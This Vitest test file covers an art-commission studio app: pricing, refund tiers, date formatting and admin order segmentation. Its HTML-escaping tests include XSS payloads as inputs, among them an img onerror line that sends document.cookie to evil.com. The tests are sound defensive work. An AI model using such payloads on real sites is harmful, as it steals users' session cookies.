import { describe, it, expect } from 'vitest';
import { calculateOrderPricing, DEFAULT_STUDIO_SETTINGS } from '@/context/StudioContext';
import { escapeHtml } from '@/lib/invoice';
import { getLocalTodayDate, getLocalFutureDate, formatMoney, formatShortDate } from '@/lib/utils';
import { getRefundTierInfo } from '@/components/track/OrderTracker';
import type { OrderDraft, SubmittedOrder } from '@/types';
import { segmentAdminOrders } from '@/components/admin/useSegmentedAdminOrders';

describe('Pricing Calculation Engine (calculateOrderPricing)', () => {
  const baseDraft: OrderDraft = {
    tier: 'fullbody',
    characterCount: 1,
    addons: { nsfw: false, softFurry: false, commercial: false },
    currency: 'USD',
    paymentSplit: '50_50',
    preferredStartDate: null,
    characterName: 'Test OC',
    poseAndVibe: 'Standing proud',
    backgroundNotes: 'Studio default',
    clientContact: 'test@example.com',
    references: [],
    tosAccepted: true,
    tosAcceptedAt: new Date().toISOString(),
  };

  it('calculates correct base prices for all tiers (single character, no add-ons)', () => {
    const headshot = calculateOrderPricing({ ...baseDraft, tier: 'headshot' }, DEFAULT_STUDIO_SETTINGS);
    expect(headshot.totalUsd).toBe(15);
    expect(headshot.depositUsd).toBe(8); // ceil(15 / 2) = 8
    expect(headshot.remainingUsd).toBe(7);

    const halfbody = calculateOrderPricing({ ...baseDraft, tier: 'halfbody' }, DEFAULT_STUDIO_SETTINGS);
    expect(halfbody.totalUsd).toBe(25);
    expect(halfbody.depositUsd).toBe(13); // ceil(25 / 2) = 13
    expect(halfbody.remainingUsd).toBe(12);

    const fullbody = calculateOrderPricing({ ...baseDraft, tier: 'fullbody' }, DEFAULT_STUDIO_SETTINGS);
    expect(fullbody.totalUsd).toBe(40);
    expect(fullbody.depositUsd).toBe(20);
    expect(fullbody.remainingUsd).toBe(20);

    const chibi = calculateOrderPricing({ ...baseDraft, tier: 'chibi' }, DEFAULT_STUDIO_SETTINGS);
    expect(chibi.totalUsd).toBe(10);
    expect(chibi.depositUsd).toBe(5);

    const graphics = calculateOrderPricing({ ...baseDraft, tier: 'graphics' }, DEFAULT_STUDIO_SETTINGS);
    expect(graphics.totalUsd).toBe(5);
    expect(graphics.depositUsd).toBe(3); // ceil(5 / 2) = 3
  });

  it('scales linearly with character count and clamps between 1 and 4', () => {
    // 2 characters on fullbody ($40 * 2 = $80)
    const twoChars = calculateOrderPricing({ ...baseDraft, characterCount: 2 }, DEFAULT_STUDIO_SETTINGS);
    expect(twoChars.totalUsd).toBe(80);
    expect(twoChars.depositUsd).toBe(40);

    // 4 characters on fullbody ($40 * 4 = $160)
    const fourChars = calculateOrderPricing({ ...baseDraft, characterCount: 4 }, DEFAULT_STUDIO_SETTINGS);
    expect(fourChars.totalUsd).toBe(160);

    // Clamping: 0 or negative character count is clamped to 1
    const zeroChars = calculateOrderPricing({ ...baseDraft, characterCount: 0 }, DEFAULT_STUDIO_SETTINGS);
    expect(zeroChars.totalUsd).toBe(40);

    // Clamping: >4 characters clamped to 4
    const fiveChars = calculateOrderPricing({ ...baseDraft, characterCount: 5 }, DEFAULT_STUDIO_SETTINGS);
    expect(fiveChars.totalUsd).toBe(160);
  });

  it('applies add-on multipliers correctly and compounds with character count', () => {
    // NSFW: +50% -> multiplier = 1.5. Fullbody = $40 * 1.5 = $60
    const nsfw = calculateOrderPricing(
      { ...baseDraft, addons: { nsfw: true, softFurry: false, commercial: false } },
      DEFAULT_STUDIO_SETTINGS,
    );
    expect(nsfw.multiplier).toBe(1.5);
    expect(nsfw.totalUsd).toBe(60);

    // Soft Furry: +50% -> multiplier = 1.5. Fullbody = $40 * 1.5 = $60
    const furry = calculateOrderPricing(
      { ...baseDraft, addons: { nsfw: false, softFurry: true, commercial: false } },
      DEFAULT_STUDIO_SETTINGS,
    );
    expect(furry.multiplier).toBe(1.5);
    expect(furry.totalUsd).toBe(60);

    // Commercial: +200% -> multiplier = 3.0. Fullbody = $40 * 3.0 = $120
    const commercial = calculateOrderPricing(
      { ...baseDraft, addons: { nsfw: false, softFurry: false, commercial: true } },
      DEFAULT_STUDIO_SETTINGS,
    );
    expect(commercial.multiplier).toBe(3.0);
    expect(commercial.totalUsd).toBe(120);

    // All add-ons: 1.0 + 0.5 + 0.5 + 2.0 = 4.0x. Fullbody ($40) * 2 characters ($80) * 4.0 = $320
    const allAddons = calculateOrderPricing(
      { ...baseDraft, characterCount: 2, addons: { nsfw: true, softFurry: true, commercial: true } },
      DEFAULT_STUDIO_SETTINGS,
    );
    expect(allAddons.multiplier).toBe(4.0);
    expect(allAddons.totalUsd).toBe(320);
  });

  it('handles 100% upfront payment split correctly', () => {
    const upfront = calculateOrderPricing(
      { ...baseDraft, paymentSplit: '100_upfront' },
      DEFAULT_STUDIO_SETTINGS,
    );
    expect(upfront.totalUsd).toBe(40);
    expect(upfront.depositUsd).toBe(40);
    expect(upfront.remainingUsd).toBe(0);
  });
});

describe('Security & XSS Neutralization (escapeHtml)', () => {
  it('escapes dangerous HTML special characters', () => {
    expect(escapeHtml('&')).toBe('&amp;');
    expect(escapeHtml('<')).toBe('&lt;');
    expect(escapeHtml('>')).toBe('&gt;');
    expect(escapeHtml('"')).toBe('&quot;');
    expect(escapeHtml("'")).toBe('&#039;');
  });

  it('neutralizes script injection and image error payloads', () => {
    const xssScript = '<script>alert("pwned")</script>';
    expect(escapeHtml(xssScript)).toBe('&lt;script&gt;alert(&quot;pwned&quot;)&lt;/script&gt;');

    const xssImg = '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)"/>';
    expect(escapeHtml(xssImg)).toBe(
      '&lt;img src=x onerror=&quot;fetch(&#039;https://evil.com?c=&#039;+document.cookie)&quot;/&gt;',
    );
  });

  it('handles null, undefined, numbers, and clean strings safely', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
    expect(escapeHtml('')).toBe('');
    expect(escapeHtml(12345)).toBe('12345');
    expect(escapeHtml('Clean Artist Name')).toBe('Clean Artist Name');
  });
});

describe('Dynamic Date Helpers & Formatting', () => {
  it('returns valid YYYY-MM-DD local today date', () => {
    const today = getLocalTodayDate();
    expect(today).toMatch(/^\d{4}-\d{2}-\d{2}$/);

    const now = new Date();
    const expectedYear = now.getFullYear();
    const expectedMonth = String(now.getMonth() + 1).padStart(2, '0');
    const expectedDay = String(now.getDate()).padStart(2, '0');
    expect(today).toBe(`${expectedYear}-${expectedMonth}-${expectedDay}`);
  });

  it('calculates future dates with arbitrary positive offsets', () => {
    const threeDays = getLocalFutureDate(3);
    expect(threeDays).toMatch(/^\d{4}-\d{2}-\d{2}$/);

    const targetDate = new Date();
    targetDate.setDate(targetDate.getDate() + 3);
    const expected = `${targetDate.getFullYear()}-${String(targetDate.getMonth() + 1).padStart(2, '0')}-${String(targetDate.getDate()).padStart(2, '0')}`;
    expect(threeDays).toBe(expected);
  });

  it('formats short dates and currencies correctly', () => {
    expect(formatShortDate('2026-11-05')).toBe('Nov 5');
    expect(formatMoney(40, 'USD')).toBe('$40');
  });
});

describe('TOS Refund Schedule Calculation (getRefundTierInfo)', () => {
  const totalUsd = 100;
  const depositUsd = 50;

  it('awards 100% full refund before sketching begins', () => {
    // Stage: pending_review (unpaid)
    const pendingUnpaid = getRefundTierInfo('pending_review', totalUsd, depositUsd, false, false);
    expect(pendingUnpaid.percentage).toBe('100% Full Refund');
    expect(pendingUnpaid.refundAmount).toBe(0);

    // Stage: awaiting_deposit (deposit paid)
    const awaitingPaid = getRefundTierInfo('awaiting_deposit', totalUsd, depositUsd, true, false);
    expect(awaitingPaid.percentage).toBe('100% Full Refund');
    expect(awaitingPaid.refundAmount).toBe(50);
  });

  it('awards 50% refund during sketch drafting stages', () => {
    // Stage: sketching with 50% deposit paid
    const sketching = getRefundTierInfo('sketching', totalUsd, depositUsd, true, false);
    expect(sketching.percentage).toBe('50% Refund');
    expect(sketching.refundAmount).toBe(25); // 50% of $50 deposit

    // Stage: sketch_approval with 100% paid upfront
    const sketchApprovalFullPaid = getRefundTierInfo('sketch_approval', totalUsd, depositUsd, true, true);
    expect(sketchApprovalFullPaid.percentage).toBe('50% Refund');
    expect(sketchApprovalFullPaid.refundAmount).toBe(50); // 50% of $100 total
  });

  it('rejects refunds (0% non-refundable) once lineart and rendering begin', () => {
    // Stage: lineart_coloring
    const lineart = getRefundTierInfo('lineart_coloring', totalUsd, depositUsd, true, true);
    expect(lineart.percentage).toBe('0% Non-Refundable');
    expect(lineart.refundAmount).toBe(0);

    // Stage: completed
    const completed = getRefundTierInfo('completed', totalUsd, depositUsd, true, true);
    expect(completed.percentage).toBe('0% Non-Refundable');
    expect(completed.refundAmount).toBe(0);
  });
});


describe('Admin Order Lifecycle Segmentation (segmentAdminOrders)', () => {
  const dummyBaseOrder: SubmittedOrder = {
    id: 'test-1',
    orderCode: 'MERU-20261102-TEST',
    createdAt: new Date().toISOString(),
    tier: 'fullbody',
    characterCount: 1,
    addons: { nsfw: false, softFurry: false, commercial: false },
    currency: 'USD',
    paymentSplit: '50_50',
    preferredStartDate: null,
    characterName: 'Test Character',
    poseAndVibe: 'Action pose',
    backgroundNotes: '',
    clientContact: 'client@example.com',
    references: [],
    tosAccepted: true,
    tosAcceptedAt: new Date().toISOString(),
    totalUsd: 100,
    depositUsd: 50,
    depositPaid: false,
    finalPaid: false,
    sketchApproved: false,
    stage: 'pending_review',
    progress: 0,
    authMethod: 'google',
    wips: [],
    messages: [],
  };

  it('correctly partitions incoming briefs from active pipeline and terminal archive', () => {
    const orders: SubmittedOrder[] = [
      { ...dummyBaseOrder, id: '1', stage: 'pending_review' },
      { ...dummyBaseOrder, id: '2', stage: 'awaiting_deposit', depositPaid: false },
      { ...dummyBaseOrder, id: '3', stage: 'sketching', depositPaid: true },
      { ...dummyBaseOrder, id: '4', stage: 'sketch_approval', depositPaid: true, finalPaid: false },
      { ...dummyBaseOrder, id: '5', stage: 'lineart_coloring', depositPaid: true, finalPaid: true },
      { ...dummyBaseOrder, id: '6', stage: 'completed', depositPaid: true, finalPaid: true },
      { ...dummyBaseOrder, id: '7', stage: 'declined' },
      { ...dummyBaseOrder, id: '8', stage: 'cancelled' },
    ];

    const result = segmentAdminOrders(orders);

    // Incoming briefs
    expect(result.incomingBriefs.map((o) => o.id)).toEqual(['1']);
    expect(result.counts.briefs).toBe(1);

    // Active pipeline
    expect(result.activePipeline.map((o) => o.id)).toEqual(['2', '3', '4', '5']);
    expect(result.counts.active).toBe(4);

    // Terminal archive (declined, cancelled, completed)
    expect(result.archivedOrders.map((o) => o.id)).toEqual(['6', '7', '8']);
    expect(result.counts.archived).toBe(3);

    // Pending payments: order 2 (unpaid deposit) and order 4 (unpaid final on 50/50 split)
    expect(result.pendingPayments.map((o) => o.id)).toEqual(['2', '4']);
    expect(result.counts.payments).toBe(2);

    // Invariant: briefs + active + archived must always partition total orders exactly
    expect(result.counts.briefs + result.counts.active + result.counts.archived).toBe(result.counts.total);
    expect(result.counts.total).toBe(8);
  });

  it('verifies partition invariant: briefs + active + archived === total across all commission stages', () => {
    const orders: SubmittedOrder[] = [
      { ...dummyBaseOrder, id: '1', stage: 'pending_review' },
      { ...dummyBaseOrder, id: '2', stage: 'awaiting_deposit' },
      { ...dummyBaseOrder, id: '3', stage: 'sketching' },
      { ...dummyBaseOrder, id: '4', stage: 'sketch_approval' },
      { ...dummyBaseOrder, id: '5', stage: 'lineart_coloring' },
      { ...dummyBaseOrder, id: '6', stage: 'completed' },
      { ...dummyBaseOrder, id: '7', stage: 'declined' },
      { ...dummyBaseOrder, id: '8', stage: 'cancelled' },
    ];

    const result = segmentAdminOrders(orders);
    expect(result.counts.briefs + result.counts.active + result.counts.archived).toBe(result.counts.total);
    expect(result.counts.total).toBe(orders.length);
  });

  it('flags completed orders with unpaid 50/50 balance in pendingPayments', () => {
    const orders: SubmittedOrder[] = [
      {
        ...dummyBaseOrder,
        id: 'comp-unpaid',
        stage: 'completed',
        paymentSplit: '50_50',
        depositPaid: true,
        finalPaid: false,
      },
      {
        ...dummyBaseOrder,
        id: 'comp-paid',
        stage: 'completed',
        paymentSplit: '50_50',
        depositPaid: true,
        finalPaid: true,
      },
    ];

    const result = segmentAdminOrders(orders);
    expect(result.counts.archived).toBe(2);
    expect(result.counts.payments).toBe(1);
    expect(result.pendingPayments.map((o) => o.id)).toEqual(['comp-unpaid']);
    expect(result.counts.briefs + result.counts.active + result.counts.archived).toBe(result.counts.total);
  });
});
